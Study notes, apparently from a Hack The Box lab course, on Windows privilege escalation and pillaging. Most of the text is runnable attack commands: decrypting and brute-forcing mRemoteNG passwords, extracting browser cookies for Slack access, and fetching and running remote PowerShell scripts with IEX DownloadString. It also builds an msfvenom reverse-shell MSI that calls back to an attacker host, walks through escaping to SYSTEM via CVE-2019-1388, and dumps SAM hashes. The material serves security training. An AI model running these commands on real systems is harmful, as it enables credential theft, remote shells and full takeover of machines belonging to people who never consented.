`mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

Let's look at the contents of the `confCons.xml` file.

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```


If the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

```shell-session
PrinceAli1@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```

In case we want to attempt to crack the password, we can modify the script to try multiple master passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.

```shell-session
PrinceAli1@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
```

#### Abusing Cookies to Get Access to IM Clients

##### Cookie Extraction from Firefox

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

```shell-session
PrinceAli1@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

##### Cookie Extraction from Chromium-based Browsers

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```

We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.

`SharpChromium` is looking for a file in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

#### Clipboard

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

#### Attacking Backup Servers - restic 0.13.1

##### restic - Initialize Backup Directory

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
```

##### restic - Back up a Directory

`Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
```

##### restic - Back up a Directory with VSS

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

> **Note:** If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.
{: .prompt-danger }

##### restic - Check Backups Saved in a Repository


```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
-------- -------------------- ---------------- ---------- ------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01             C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01          C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01             C:\Users\jeff\Documents
```
##### restic - Restore a Backup with ID

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

If we navigate to `C:\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\Restore\C\SampleFolder`.


### Miscellaneous Techniques

#### Always Install Elevated Setting

##### Enumerating Always Install Elevated Settings

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated    REG_DWORD    0x1
```

Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

##### Exploiting Setting

```shell-session
PrinceAli1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:

``` batch
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

If all goes to plan, we will receive a connection back as `NT AUTHORITY\SYSTEM`.

#### CVE-2019-1388

[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The `Issued By` field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. This OID value is identified in the [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header as [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.

When we click on the hyperlink, a browser window will launch running as `NT AUTHORITY\SYSTEM`. Once the browser is opened, it is possible to "break out" of it by leveraging the `View page source` menu option to launch a `cmd.exe` or `PowerShell.exe` console as SYSTEM.

**Microsoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.**

1. First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.
2. Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.

    ![image](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)

3. Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.

    ![image](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)

4. If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.
5. Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.
6. At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

#### Scheduled Tasks

##### Enumerating Scheduled Tasks

By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`, which standard users do not have read access to.

We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

``` batch
C:\htb>  schtasks /query /fo LIST /v
```

```powershell
PS C:\htb> Get-ScheduledTask | select TaskName,State
```

Check permission on a folder meant for scheduled tasks

``` batch
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
```

#### User/Computer Description Field

```powershell
PS C:\htb> Get-LocalUser
```

```powershell
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
```

#### Mount VHDX/VMDK
##### Mount VMDK on Linux

```shell-session
PrinceAli1@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

##### Mount VHD/VHDX on Linux

```shell-session
PrinceAli1@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

##### Retrieving Hashes using Secretsdump.py

Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.

```shell-session
PrinceAli1@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## **Dealing with End of Life Systems**

### Server 2008 Case Study

#### Running Sherlock

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -Scope process
PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns
```

> In `msfconsole`  make sure to search by CVEID from output above
{: .prompt-tip }
> Try using `rdesktop -u [Username] -p [Password] [IP Address]` if `xfreerdp` does not work
{: .prompt-tip }
> Use `exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp` Module in Metasploit for Shell
{: .prompt-tip }

### Windows 7 Case Study

We can also use this [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) (`msfconsole` module) which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.

For our Windows 7 target, we can use `Sherlock` again like in the Server 2008.

We also have [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) but it uses `python` 2.7
